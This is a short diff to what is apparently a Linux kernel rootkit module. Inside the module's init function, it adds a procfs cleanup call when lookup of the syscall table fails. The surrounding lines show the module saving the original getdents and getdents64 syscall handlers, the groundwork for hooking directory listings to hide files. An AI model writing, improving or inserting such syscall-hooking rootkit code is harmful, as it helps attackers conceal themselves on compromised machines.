@@ -214,8 +214,10 @@ static int __init rootkit_init(void)
 				procfs_clean();
 				return -1;
 		}
-        if(!(syscall_table = (unsigned long *)get_syscall_table()))
+        if(!(syscall_table = (unsigned long *)get_syscall_table())) {
+				procfs_clean();
                 return -1;
+		}
 
         original_getdents64 = (void*)syscall_table[__NR_getdents64];
         original_getdents = (void*)syscall_table[__NR_getdents];
